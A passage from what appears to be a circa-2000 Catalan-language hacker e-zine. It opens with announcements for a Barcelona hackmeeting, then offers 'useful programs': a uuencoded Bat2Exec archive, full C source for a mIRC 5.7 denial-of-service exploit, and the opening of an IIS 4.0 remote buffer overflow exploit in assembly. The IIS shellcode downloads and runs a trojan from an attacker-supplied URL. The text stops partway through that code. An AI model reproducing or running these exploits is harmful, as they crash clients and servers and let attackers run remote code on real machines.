 *No només d'angles viu l'home. Altres llengues i cultures en la Xarxa.
 *FreeNet, Napster, Gnutella... ¿nou escenari?


MOLT MACO, PERO EN QUE CONSISTIRA EL hmBCN?

El programa final de les conferencies i tallers s'anira confeccionant
durant l'estiu del 2000. Aquest es un sistema totalment obert i qualsevol
persona o grup que vulgui muntar tallers i conferencies sobre els seus
temes preferits pot fer-ho. Qui cregui que te alguna cosa a dir a la
comunitat esta aqui més buscat que tots els noms famosos que puguis
imaginar. Escriu-nos a la llista o al webmaster.



I EM PAGARAN EL VIATGE?

No crec, a no ser que vinguis de moooolt lluny, hi ha poc presupost.
Les inscripcions seran voluntaries (1000 pts) i els ingressos vindran
de les festes.


De moment vidra:

* Zona Enfopol (Arturo Quirantes)
*  Barrapunto  (Barahona) com centre dels movimients de soft libre
(grupos linux, freebsd..) que deurien donarse por enterats tambe
* Plataforma Internauta
* Asociacio de Internautas (tots dos pel tema telefonic)
* APEDANICA (informatics per la responsabilitat)
* ISOC  (Internet Society)
* Hispasec, Kriptopolis y Criptonomicon (boletins de seguritat)
* Campanya por el dominio .ct
* Colectiu macquero
* Listas i news de hack
* Alberto Escudero
* Amadeu Abril
* Claudio Hernandez
* Angeloso
* Savage de Els Apostols
* Cuartango voldra vindre?
* CatHack
* Hispahack
* TINET, la primera xarxa ciutadana lliure
* Gente de FidoNet
* IRC-Hispano, Univers, Union Latina, Esnet (redes de IRC)

----
Para desuscribirte, envía un mail a hackmeeting-request@sindominio.net 
y pon "unsubscribe" (sin comillas) en el subject o asunto.


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
==============================================================================
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

$13$

CFI:

Aqui us adjuntem uns quants programes i codigs fonts utils.

1.- Bat2Exec : Converteix un fitxer de lots BATCH a un EXE.
2.- DieMirc.c : Atac DoS al mIRC.
3.- IisHack.asm : Atac DoS a màquines amb IIS
4.- IisDoS.uue : Atac DoS a màquines amb IIS


---[ bat2exec.uue ]-------------cuthere 8<-------------------

begin 666 BAT2EXEC.zip
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
I`/^!`````$)!5#)%6$5#+D-/35!+!08``````0`!`#H```"H$@``````
`
end

---[ bat2exec.uue ]--------------->8 cuthere-----------------

--------[DieMirc.C]-----------------------------------------------------------
/*
diemirc.c - mIRC 5.7 denial of service exploits.
(c) Chopsui-cide/MmM '00
The Mad Midget Mafia - http://midgets.box.sk/

Disclaimer: this program is proof of concept code, and
is not intended to be used maliciously. By using this
code, you take all responsibility for any damage incurred
by the use of it.

This program listens on port 6667 for incoming connections,
then crashes mIRC using the exploit you choose.
*/

#include <winsock.h>
#include <stdio.h>

#define LISTEN_PORT 6667
#define TARGET_NICK "Chopsui-cide"

void listen_sock(int sock, int port);
void die(char *message);
int poll_for_connect(int listensock);
int select_sploit();

void exploit1(int s);
void exploit2(int s);
void exploit3(int s);
void exploit4(int s);

main()
{
	int ls;
	int c;
	WSADATA wsaData;
	WORD wVersionRequested;
	wVersionRequested = MAKEWORD(1, 1);
	if (WSAStartup(wVersionRequested, &wsaData) < 0) die("Unable to initialise Winsock.");
	if ((ls = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) die("Unable to create socket.");
	c = select_sploit();
	listen_sock(ls, LISTEN_PORT);
	printf("Waiting for connection on port %d...\n", LISTEN_PORT);
	ls = poll_for_connect(ls);
	switch (c)
	{
		case 0 :
			exploit1(ls);
		break;
		case 1 :
			exploit2(ls);
		break;
		case 2 :
			exploit3(ls);
		break;
		case 3 :
			exploit4(ls);
	}
	closesocket(ls);
	return 0;
}

void listen_sock(int sock, int port)
{
	struct sockaddr_in addr;
	int c = 0;

	memset((char *)&addr,'0', sizeof(addr));

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(port);

	if (bind(sock, &addr, sizeof(addr)) == -1) die("Error binding socket.");
	if (listen(sock, 20) == -1) die("Error listening.");
}

void die(char *message)
{
	printf("Fatal error: %s\n", message);
	exit(1);
}

int poll_for_connect(int listensock)
{
	struct sockaddr_in peer;
	int sendsock;
	int szpeer = sizeof(peer);
	do
	{
		sendsock = accept(listensock, (struct sockaddr *) &peer, &szpeer);
	} while(sendsock == -1);
	printf("Connection from [%s].\n", inet_ntoa(peer.sin_addr));
	return sendsock;
}

#define last_select 3
int select_sploit()
{
	char k;
	printf("Select exploit:\n0 - incomplete nick change.\n");
	printf("1 - msg with loads of parameters.\n2 - incomplete mode change.\n");
	printf("3 - incomplete kick.\n");
	k = getch();
	if (atoi((char *)&k) > last_select)
	{
		printf("Invalid selection.\n");
		exit(1);
	}
	if (((int)k < 0x30) || ((int)k > 0x39))
	{
		printf("Invalid selection.\n");
		exit(1);
	}
	return atoi((char *)&k);
}

/*
Exploit 1: incomplete nick change
mIRC 5.7 and past versions seem to suffer from bugs
involving incomplete messages. I previously e-mailed
Khaled M. Bey about one such bug, and it's fixed in
this version, but there are other similiar (almost
identical) bugs still in v5.7.
This attack is executed from the _server_ side.
All we need to do is send the client a half complete
nick change message, ie
":<targetnick>!ident@host.com NICK"
We must put the target's current nick name where
<targetnick> is.
*/
#define END "!ident@host.com NICK\x0a"
void exploit1(int s)
{
	char sod[256];
	memset((char *)&sod, '\0', 256);
	sod[0] = ':';
	strcat(sod, TARGET_NICK);
	strcat(sod, END);
	send(s, sod, 256, 0);
	Sleep(1000); // Make sure the packet gets there.
}

/*
Exploit 2: server message overflow
If the client sends a large message with to many
parameters, it crashes, and part of the buffer is
stuffed into EAX.
*/
#define MSG_LEN 1000 // This must be an even number.
void exploit2(int s)
{
	char sod[MSG_LEN];
	int c = 0;
	do
	{
		sod[c] = 0xff;
		sod[c + 1] = ' ';
		c += 2;
	} while(c < MSG_LEN);
	send(s, sod, MSG_LEN, 0);
	Sleep(1000); // Make sure the packet gets there.
}

/*
Exploit 3: incomplete mode change
This is basically the same as the nick change
exploit.
*/
#define END "!ident@host.com MODE\x0a"
void exploit3(int s)
{
	char sod[256];
	memset((char *)&sod, '\0', 256);
	sod[0] = ':';
	strcat(sod, TARGET_NICK);
	strcat(sod, END);
	send(s, sod, 256, 0);
	Sleep(1000); // Make sure the packet gets there.
}

/*
Exploit 4: incomplete kick
Another incomplete message bug.
*/
#define JOIN " JOIN #\x0a"
#define KICK ": KICK #\x0a"
void exploit4(int s)
{
	char sod[256];
	memset((char *)&sod, '\0', 256);
	sod[0] = ':';
	strcat(sod, TARGET_NICK);
	strcat(sod, JOIN);
	printf("%s%s", sod, KICK);
	send(s, sod, strlen(sod), 0);
	send(s, KICK, strlen(KICK), 0);
	Sleep(1000); // Make sure the packet gets there.
}

--------[DieMirc.C]-----------------------------------------------------------

--------[isshack.asm]---------------------------------------------------------
; IIS 4.0 remote overflow exploit.                       
; (c) dark spyrit -- barns@eeye.com
;
; greets & thanks to: neophyte/sacx/tree/everyone in #mulysa and
;                     #beavuh... and all the other kiwi's except ceo.
;
; credits to acp for the console stuff..
;
; I don't want to go in too deeply on the process of exploiting buffer
; overflows... there's various papers out there on this subject, instead I'll
; give just a few specifics relating to this one..
;
; Microsoft was rather good to us on this occasion, stuffing our eip value
; directly into a register then calling it.. no need to stuff valid addresses
; to make our way through various routines to eventually return to our 
; address... but, unfortunately it wasn't all smooth sailing. 
; Various bytes and byte sequences I was forced to avoid, as you'll quickly
; notice should you bother debugging this.. various push/pop pairs etc.
; I don't bother with any cleanup when all is done, NT's exception handling
; can cope with the mess :)
;
; The exploit works by redirecting the eip to the address of a loaded dll, 
; in this case ISM.DLL. Why?
; Because its loaded in memory, is loaded at a high address which gets around
; the null byte problem.. and is static on all service packs.
; The code from ISM.DLL jumps to my code, which creates a jump table of
; of functions we'll need, including the socket functions.. we do this 
; because unfortunately the dll's import tables don't include nearly enough
; of the functions we need..
; 
; The socket structure is created and filled at runtime, I had to do this
; at runtime because of the bad byte problem.. after this a small buffer is
; created, a get request issued to the web site of the file you want to 
; download.. file is then received/saved to disk/and executed..
; Simple huh? no not really :)
;
; Have fun with this one... feel free to drop me an email with any comments.
;
; And finally, heh.. "caveat emptor".
;
;
; you can grab the assembled exe at http://www.eEye.com.
;
; to assemble:
;
; tasm32 -ml iishack.asm
; tlink32 -Tpe -c -x iishack.obj ,,, import32


.386p
locals
jumps
.model flat, stdcall


extrn GetCommandLineA:PROC
extrn GetStdHandle:PROC
extrn WriteConsoleA:PROC
extrn ExitProcess:PROC
extrn WSAStartup:PROC
extrn connect:PROC
extrn send:PROC
extrn recv:PROC
extrn WSACleanup:PROC
extrn gethostbyname:PROC
extrn htons:PROC
extrn socket:PROC
extrn inet_addr:PROC
extrn closesocket:PROC

.data

sploit_length           equ     1157

sploit:
 db "GET /" 
 db 041h, 041h, 041h, 041h, 041h, 041h, 041h
 db 576 dup (041h)
 db 041h, 041h, 041h, 041h, 041h, 041h, 0b0h, 087h, 067h, 068h, 0b0h, 087h
 db 067h, 068h, 090h, 090h, 090h, 090h, 058h, 058h, 090h, 033h, 0c0h, 050h
 db 05bh, 053h, 059h, 08bh, 0deh, 066h, 0b8h, 021h, 002h, 003h, 0d8h, 032h
 db 0c0h, 0d7h, 02ch, 021h, 088h, 003h, 04bh, 03ch, 0deh, 075h, 0f4h, 043h
 db 043h, 0bah, 0d0h, 010h, 067h, 068h, 052h, 051h, 053h, 0ffh, 012h, 08bh
 db 0f0h, 08bh, 0f9h, 0fch, 059h, 0b1h, 006h, 090h, 05ah, 043h, 032h, 0c0h
 db 0d7h, 050h, 058h, 084h, 0c0h, 050h, 058h, 075h, 0f4h, 043h, 052h, 051h
 db 053h, 056h, 0b2h, 054h, 0ffh, 012h, 0abh, 059h, 05ah, 0e2h, 0e6h, 043h
 db 032h, 0c0h, 0d7h, 050h, 058h, 084h, 0c0h, 050h, 058h, 075h, 0f4h, 043h
 db 052h, 053h, 0ffh, 012h, 08bh, 0f0h, 05ah, 033h, 0c9h, 050h, 058h, 0b1h
 db 005h, 043h, 032h, 0c0h, 0d7h, 050h, 058h, 084h, 0c0h, 050h, 058h, 075h
 db 0f4h, 043h, 052h, 051h, 053h, 056h, 0b2h, 054h, 0ffh, 012h, 0abh, 059h
 db 05ah, 0e2h, 0e6h, 033h, 0c0h, 050h, 040h, 050h, 040h, 050h, 0ffh, 057h
 db 0f4h, 089h, 047h, 0cch, 033h, 0c0h, 050h, 050h, 0b0h, 002h, 066h, 0abh
 db 058h, 0b4h, 050h, 066h, 0abh, 058h, 0abh, 0abh, 0abh, 0b1h, 021h, 090h
 db 066h, 083h, 0c3h, 016h, 08bh, 0f3h, 043h, 032h, 0c0h, 0d7h, 03ah, 0c8h
 db 075h, 0f8h, 032h, 0c0h, 088h, 003h, 056h, 0ffh, 057h, 0ech, 090h, 066h
 db 083h, 0efh, 010h, 092h, 08bh, 052h, 00ch, 08bh, 012h, 08bh, 012h, 092h
 db 08bh, 0d7h, 089h, 042h, 004h, 052h, 06ah, 010h, 052h, 0ffh, 077h, 0cch
 db 0ffh, 057h, 0f8h, 05ah, 066h, 083h, 0eeh, 008h, 056h, 043h, 08bh, 0f3h
 db 0fch, 0ach, 084h, 0c0h, 075h, 0fbh, 041h, 04eh, 0c7h, 006h, 08dh, 08ah
 db 08dh, 08ah, 081h, 036h, 080h, 080h, 080h, 080h, 033h, 0c0h, 050h, 050h
 db 06ah, 048h, 053h, 0ffh, 077h, 0cch, 0ffh, 057h, 0f0h, 058h, 05bh, 08bh
 db 0d0h, 066h, 0b8h, 0ffh, 00fh, 050h, 052h, 050h, 052h, 0ffh, 057h, 0e8h
 db 08bh, 0f0h, 058h, 090h, 090h, 090h, 090h, 050h, 053h, 0ffh, 057h, 0d4h
 db 08bh, 0e8h, 033h, 0c0h, 05ah, 052h, 050h, 052h, 056h, 0ffh, 077h, 0cch
 db 0ffh, 057h, 0ech, 080h, 0fch, 0ffh, 074h, 00fh, 050h, 056h, 055h, 0ffh
 db 057h, 0d8h, 080h, 0fch, 0ffh, 074h, 004h, 085h, 0c0h, 075h, 0dfh, 055h
 db 0ffh, 057h, 0dch, 033h, 0c0h, 040h, 050h, 053h, 0ffh, 057h, 0e4h, 090h
 db 090h, 090h, 090h, 0ffh, 06ch, 066h, 073h, 06fh, 066h, 06dh, 054h, 053h
 db 021h, 080h, 08dh, 084h, 093h, 086h, 082h, 095h, 021h, 080h, 08dh, 098h
 db 093h, 08ah, 095h, 086h, 021h, 080h, 08dh, 084h, 08dh, 090h, 094h, 086h
 db 021h, 080h, 08dh, 090h, 091h, 086h, 08fh, 021h, 078h, 08ah, 08fh, 066h
 db 099h, 086h, 084h, 021h, 068h, 08dh, 090h, 083h, 082h, 08dh, 062h, 08dh
 db 08dh, 090h, 084h, 021h, 078h, 074h, 070h, 064h, 06ch, 054h, 053h, 021h
 db 093h, 086h, 084h, 097h, 021h, 094h, 086h, 08fh, 085h, 021h, 094h, 090h
 db 084h, 08ch, 086h, 095h, 021h, 084h, 090h, 08fh, 08fh, 086h, 084h, 095h
 db 021h, 088h, 086h, 095h, 089h, 090h, 094h, 095h, 083h, 09ah, 08fh, 082h
 db 08eh, 086h, 021h, 090h, 098h, 08fh, 04fh, 086h, 099h, 086h, 021h
 _url2 db 85 dup (021h)
 db ".htr HTTP/1.0"
 db 00dh,00ah, 00dh, 00ah  

logo  db "------(IIS 4.0 remote buffer overflow exploit)---------------------------------", 13, 10
      db "(c) dark spyrit -- barns@eeye.com.",13,10
      db "http://www.eEye.com",13,10,13,10
      db "[usage: iishack <host> <port> <url>]", 13, 10
      db "eg - iishack www.example.com 80 www.myserver.com/thetrojan.exe",13,10
      db "do not include 'http://' before hosts!",13,10
      db "-------------------------------------------------------------------------------", 13, 10, 0
logolen equ $-logo

u_length db 10,"No more than 70 chars in 2nd url.",13,10,0
u_lengthl equ $-u_length

errorinit db 10,"Error initializing winsock.", 13, 10, 0
errorinitl equ $-errorinit

nohost db 10,"No host or IP specified.", 13,10,0
nohostl equ $-nohost

noport db 10,"No port specified.",13,10,0
noportl equ $-noport

no_url db 10,"No URL specified.",13,10,0
no_urll equ $-no_url

urlinv db 10,"Invalid URL.. no file specified?",13,10,0
urlinvl equ $-urlinv

reshost db 10,"Error resolving host.",13,10,0
reshostl equ $-reshost

sockerr db 10,"Error creating socket.",13,10,0
sockerrl equ $-sockerr

ipill   db 10,"IP error.",13,10,0
ipilll   equ $-ipill

porterr db 10,"Invalid port.",13,10,0
porterrl equ $-porterr

cnerror db 10,"Error establishing connection.",13,10,0
cnerrorl equ $-cnerror

success db 10,"Data sent!",13,10,0
successl equ $-success

console_in      dd      ?
console_out     dd      ?
bytes_read      dd      ?

wsadescription_len equ 256
wsasys_status_len equ 128

WSAdata struct
wVersion dw ?
wHighVersion dw ?
szDescription db wsadescription_len+1 dup (?)
szSystemStatus db wsasys_status_len+1 dup (?)
iMaxSockets dw ?
iMaxUdpDg dw ?
lpVendorInfo dw ?
WSAdata ends

sockaddr_in struct
sin_family dw ?
sin_port dw ?
sin_addr dd ?
sin_zero db 8 dup (0)
sockaddr_in ends

wsadata WSAdata <?>
sin sockaddr_in <?>
sock dd ?
numbase dd 10
_port db 256 dup (?)
_host db 256 dup (?)
_url db 256 dup (?)
stuff db 042h, 068h, 066h, 075h, 041h, 050h

.code
start:

	call    init_console
	push    logolen
	push    offset logo
	call    write_console

	call    GetCommandLineA
	mov     edi, eax
	mov     ecx, -1
	xor     al, al
	push    edi
	repnz   scasb
	not     ecx
	pop     edi
	mov     al, 20h
	repnz   scasb
	dec     ecx
	cmp     ch, 0ffh
	jz      @@0
	test    ecx, ecx
	jnz     @@1
@@0:        
	push    nohostl
	push    offset nohost
	call    write_console
	jmp     quit3
@@1:
	mov     esi, edi
	lea     edi, _host
	call    parse
	or      ecx, ecx
	jnz     @@2
	push    noportl
	push    offset noport
	call    write_console
